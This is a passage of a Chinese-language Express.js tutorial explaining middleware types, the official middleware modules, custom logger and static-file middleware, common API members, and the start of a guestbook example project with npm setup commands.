punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'USER'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>多个处理函数：</p><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/user/:id'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Request URL:'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>originalUrl<span class="token punctuation">)</span>  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Request Type:'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>method<span class="token punctuation">)</span>  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>多个路由处理函数：</p><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/user/:id'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'ID:'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>id<span class="token punctuation">)</span>  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'User Info'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// handler for the /user/:id path, which prints the user ID</span>app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/user/:id'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>最后一个例子：</p><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/user/:id'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// if the user ID is 0, skip to the next route</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>id <span class="token operator">===</span> <span class="token string">'0'</span><span class="token punctuation">)</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token string">'route'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// otherwise pass the control to the next middleware function in this stack</span>  <span class="token keyword">else</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// render a regular page</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'regular'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// handler for the /user/:id path, which renders a special page</span>app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/user/:id'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'special'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>######## 路由级别中间件</p><p>创建路由实例：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>示例：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// a middleware function with no mount path. This code is executed for every request to the router</span>router<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Time:'</span><span class="token punctuation">,</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// a middleware sub-stack shows request info for any type of HTTP request to the /user/:id path</span>router<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/user/:id'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Request URL:'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>originalUrl<span class="token punctuation">)</span>  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Request Type:'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>method<span class="token punctuation">)</span>  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// a middleware sub-stack that handles GET requests to the /user/:id path</span>router<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/user/:id'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// if the user ID is 0, skip to the next router</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>id <span class="token operator">===</span> <span class="token string">'0'</span><span class="token punctuation">)</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token string">'route'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// otherwise pass control to the next middleware function in this stack</span>  <span class="token keyword">else</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// render a regular page</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'regular'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// handler for the /user/:id path, which renders a special page</span>router<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/user/:id'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>id<span class="token punctuation">)</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'special'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// mount the router on the app</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> router<span class="token punctuation">)</span></code></pre><p>另一个示例：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// predicate the router with a check and bail out when needed</span>router<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'x-auth'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token string">'router'</span><span class="token punctuation">)</span>  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>router<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'hello, user!'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// use the router and 401 anything falling through</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> router<span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">sendStatus</span><span class="token punctuation">(</span><span class="token number">401</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>######## 错误处理中间件</p><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span> req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>err<span class="token punctuation">.</span>stack<span class="token punctuation">)</span>  res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Something broke!'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>######## 内置中间件</p><ul><li><a href="http://expressjs.com/en/4x/api.html##express.static" target="_blank" rel="noopener">express.static</a> serves static assets such as HTML files, images, and so on.</li><li><a href="http://expressjs.com/en/4x/api.html##express.json" target="_blank" rel="noopener">express.json</a> parses incoming requests with JSON payloads. <strong>NOTE: Available with Express 4.16.0+</strong></li><li><a href="http://expressjs.com/en/4x/api.html##express.urlencoded" target="_blank" rel="noopener">express.urlencoded</a> parses incoming requests with URL-encoded payloads. <strong>NOTE: Available with Express 4.16.0+</strong></li></ul><p>官方支持的中间件列表：</p><ul><li><a href="https://github.com/senchalabs/connect##middleware" target="_blank" rel="noopener">https://github.com/senchalabs/connect##middleware</a></li></ul><p>######## 第三方中间件</p><blockquote><p>官方中间件资源：<a href="http://expressjs.com/en/resources/middleware.html" target="_blank" rel="noopener">http://expressjs.com/en/resources/middleware.html</a></p></blockquote><p>早期的 Express 内置了很多中间件。后来 Express 在 4.x 之后移除了这些内置中间件，官方把这些功能性中间件以包的形式单独提供出来。这样做的目的是为了保持 Express 本身极简灵活的特性，开发人员可以根据自己的需求去灵活的定制。下面是官方提供的一些常用的中间件解决方案。</p><table><thead><tr><th>Middleware module</th><th>Description</th><th>Replaces built-in function (Express 3)</th></tr></thead><tbody><tr><td><a href="http://expressjs.com/en/resources/middleware/body-parser.html" target="_blank" rel="noopener">body-parser</a></td><td>Parse HTTP request body. See also: <a href="https://github.com/raynos/body" target="_blank" rel="noopener">body</a>, <a href="https://github.com/vision/images/co-body" target="_blank" rel="noopener">co-body</a>, and <a href="https://github.com/stream-utils/raw-body" target="_blank" rel="noopener">raw-body</a>.</td><td>express.bodyParser</td></tr><tr><td><a href="http://expressjs.com/en/resources/middleware/compression.html" target="_blank" rel="noopener">compression</a></td><td>Compress HTTP responses.</td><td>express.compress</td></tr><tr><td><a href="http://expressjs.com/en/resources/middleware/connect-rid.html" target="_blank" rel="noopener">connect-rid</a></td><td>Generate unique request ID.</td><td>NA</td></tr><tr><td><a href="http://expressjs.com/en/resources/middleware/cookie-parser.html" target="_blank" rel="noopener">cookie-parser</a></td><td>Parse cookie header and populate <code>req.cookies</code>. See also <a href="https://github.com/jed/cookies" target="_blank" rel="noopener">cookies</a> and <a href="https://github.com/jed/keygrip" target="_blank" rel="noopener">keygrip</a>.</td><td>express.cookieParser</td></tr><tr><td><a href="http://expressjs.com/en/resources/middleware/cookie-session.html" target="_blank" rel="noopener">cookie-session</a></td><td>Establish cookie-based sessions.</td><td>express.cookieSession</td></tr><tr><td><a href="http://expressjs.com/en/resources/middleware/cors.html" target="_blank" rel="noopener">cors</a></td><td>Enable cross-origin resource sharing (CORS) with various options.</td><td>NA</td></tr><tr><td><a href="http://expressjs.com/en/resources/middleware/csurf.html" target="_blank" rel="noopener">csurf</a></td><td>Protect from CSRF exploits.</td><td>express.csrf</td></tr><tr><td><a href="http://expressjs.com/en/resources/middleware/errorhandler.html" target="_blank" rel="noopener">errorhandler</a></td><td>Development error-handling/debugging.</td><td>express.errorHandler</td></tr><tr><td><a href="http://expressjs.com/en/resources/middleware/method-override.html" target="_blank" rel="noopener">method-override</a></td><td>Override HTTP methods using header.</td><td>express.methodOverride</td></tr><tr><td><a href="http://expressjs.com/en/resources/middleware/morgan.html" target="_blank" rel="noopener">morgan</a></td><td>HTTP request logger.</td><td>express.logger</td></tr><tr><td><a href="http://expressjs.com/en/resources/middleware/multer.html" target="_blank" rel="noopener">multer</a></td><td>Handle multi-part form data.</td><td>express.bodyParser</td></tr><tr><td><a href="http://expressjs.com/en/resources/middleware/response-time.html" target="_blank" rel="noopener">response-time</a></td><td>Record HTTP response time.</td><td>express.responseTime</td></tr><tr><td><a href="http://expressjs.com/en/resources/middleware/serve-favicon.html" target="_blank" rel="noopener">serve-favicon</a></td><td>Serve a favicon.</td><td>express.favicon</td></tr><tr><td><a href="http://expressjs.com/en/resources/middleware/serve-index.html" target="_blank" rel="noopener">serve-index</a></td><td>Serve directory listing for a given path.</td><td>express.directory</td></tr><tr><td><a href="http://expressjs.com/en/resources/middleware/serve-static.html" target="_blank" rel="noopener">serve-static</a></td><td>Serve static files.</td><td>express.static</td></tr><tr><td><a href="http://expressjs.com/en/resources/middleware/session.html" target="_blank" rel="noopener">session</a></td><td>Establish server-based sessions (development only).</td><td>express.session</td></tr><tr><td><a href="http://expressjs.com/en/resources/middleware/timeout.html" target="_blank" rel="noopener">timeout</a></td><td>Set a timeout period for HTTP request processing.</td><td>express.timeout</td></tr><tr><td><a href="http://expressjs.com/en/resources/middleware/vhost.html" target="_blank" rel="noopener">vhost</a></td><td>Create virtual domains.</td><td>express.vhost</td></tr></tbody></table><h6 id="中间件应用"><a href="#中间件应用" class="headerlink" title="中间件应用"></a>中间件应用</h6><p>######## 输出请求日志中间件</p><blockquote><p> 功能：实现为任何请求打印请求日志的功能。</p></blockquote><p><code>logger.js</code> 定义并导出一个中间件处理函数：</p><pre class=" language-javascript"><code class="language-javascript">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>method<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> -- </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>path<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span>  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p><code>app.js</code> 加载使用中间件处理函数：</p><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>logger<span class="token punctuation">)</span></code></pre><p>######## 统一处理静态资源中间件</p><blockquote><p>功能：实现 express.static() 静态资源处理功能</p></blockquote><p><code>static.js</code> 定义并导出一个中间件处理函数：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token keyword">static</span><span class="token punctuation">(</span>pathPrefix<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> filePath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>pathPrefix<span class="token punctuation">,</span> req<span class="token punctuation">.</span>path<span class="token punctuation">)</span>    fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span>filePath<span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span> data<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 继续往后匹配查找能处理该请求的中间件</span>        <span class="token comment" spellcheck="true">// 如果找不到，则 express 会默认发送 can not get xxx</span>        <span class="token keyword">return</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span>      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><code>app.js</code> 加载并使用 static 中间件处理函数：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 不限定请求路径前缀</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">static</span><span class="token punctuation">(</span><span class="token string">'./public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">static</span><span class="token punctuation">(</span><span class="token string">'./node_modules'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 限定请求路径前缀</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/public'</span><span class="token punctuation">,</span> <span class="token keyword">static</span><span class="token punctuation">(</span><span class="token string">'./public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/node_modules'</span><span class="token punctuation">,</span> <span class="token keyword">static</span><span class="token punctuation">(</span><span class="token string">'./node_modules'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h4><blockquote><p>参考文档：</p><ul><li><a href="http://expressjs.com/en/guide/error-handling.html" target="_blank" rel="noopener">Error handling</a></li></ul></blockquote><h4 id="常用-API-1"><a href="#常用-API-1" class="headerlink" title="常用 API"></a>常用 API</h4><blockquote><p>参考文档：</p><ul><li><a href="http://expressjs.com/en/4x/api.html" target="_blank" rel="noopener">4.x API</a></li></ul></blockquote><h6 id="express"><a href="#express" class="headerlink" title="express"></a>express</h6><ul><li>express.json</li><li>express.static</li><li>express.Router</li><li>express.urlencoded()</li></ul><h6 id="Application"><a href="#Application" class="headerlink" title="Application"></a>Application</h6><ul><li>app.set</li><li>app.get</li><li>app.locals</li></ul><h6 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h6><ul><li>req.app</li><li>req.query</li><li>req.body</li><li>req.cookies</li><li>req.ip</li><li>req.hostname</li><li>Req.method</li><li>req.params</li><li>req.path</li><li>req.get()</li></ul><h6 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h6><ul><li>res.locals</li><li>res.append()</li><li>res.cookie()</li><li>res.clearCookie()</li><li>res.download()</li><li>res.end()</li><li>res.json()</li><li>res.jsonp()</li><li>res.redirect()</li><li>res.render()</li><li>res.send()</li><li>res.sendStatus()</li><li>res.set()</li><li>res.status()</li></ul><h6 id="Router"><a href="#Router" class="headerlink" title="Router"></a>Router</h6><ul><li>router.all()</li><li>router.METHOD()</li><li>router.use()</li></ul><h4 id="小案例"><a href="#小案例" class="headerlink" title="小案例"></a>小案例</h4><blockquote><p>案例Github仓库地址：<a href="https://github.com/lipengzhou/express-guestbook-case" target="_blank" rel="noopener">https://github.com/lipengzhou/express-guestbook-case</a></p></blockquote><h6 id="零、准备"><a href="#零、准备" class="headerlink" title="零、准备"></a>零、准备</h6><p>完整目录结构如下：</p><pre><code>.├── node_modules npm安装的第三方包目录，使用 npm 装包会自动创建├── public 页面需要使用的静态资源│   ├── css│   ├── js│   ├── img│   └── ...├── views 所有视图页面（只存储 html 文件）│   ├── publish.html│   └── index.html├── app.js 服务端程序入口文件，执行该文件会启动我们的 Web 服务器├── db.json 这里充当我们的数据库├── README.md 项目说明文档├── package.json 项目包说明文件，存储第三方包依赖等信息└── package-lock.json npm的包锁定文件，用来锁定第三方包的版本和提高npm下载速度</code></pre><pre class=" language-shell"><code class="language-shell">## 创建项目目录mkdir guestbook## 进入项目目录cd guestbook## 初始化 package.json 文件npm init -y## 将 Express 安装到项目中npm install express</code></pre><h6 id="一、Hello-World"><a href="#一、Hello-World" class="headerlink" title="一、Hello World"></a>一、Hello World</h6><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 0. 加载 Express</span><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 1. 调用 express() 得到一个 app</span><span class="token comment" spellcheck="true">//    类似于 http.createServer()</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 2. 设置请求对应的处理函数</span><span class="token comment" spellcheck="true">//    当客户端以 GET 方法请求 / 的时候就会调用第二个参数：请求处理函数</span>app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'hello world'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 3. 监听端口号，启动 Web 服务</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'app listening on port 3000!'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h6 id="二、配置模板引擎"><a href="#二、配置模板引擎" class="headerlink" title="二、配置模板引擎"></a>二、配置模板引擎</h6><blockquote><p>参见：Express - 使用模板引擎</p></blockquote><h6 id="三、路由设计"><a href="#三、路由设计" class="headerlink" title="三、路由设计"></a>三、路由设计</h6><table><thead><tr><th>请求方法</th><th>请求路径</th><th>作用</th></tr></thead><tbody><tr><td>GET</td><td>/</td><td>渲染 index.html</td></tr><tr><td>GET</td><td>/publish</td><td>渲染 publish.html</td></tr><tr><td>POST</td><td>/publish</td><td>处理发表留言</td></tr></tbody></table><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// ...</span><span class="token punctuation">}</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/publish'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// ...</span><span class="token punctuation">}</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/publish'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// ...</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h6 id="四、走通页面渲染跳转"><a href="#四、走通页面渲染跳转" class="headerlink" title="四、走通页面渲染跳转"></a>四、走通页面渲染跳转</h6><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/publish'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'publish.html'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h6 id="五、安装处理-Bootstrap-样式文件"><a href="#五、安装处理-Bootstrap-样式文件" class="headerlink" title="五、安装处理 Bootstrap 样式文件"></a>五、安装处理 Bootstrap 样式文件</h6><p>安装 <code>bootstrap</code> 到项目中：</p><pre class=" language-shell"><code class="language-shell">npm install bootstrap</code></pre><p>将 <code>node_modules</code> 目录开放出来：</p><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/node_modules/'</span><span class="token punctuation">,</span> express<span class="token 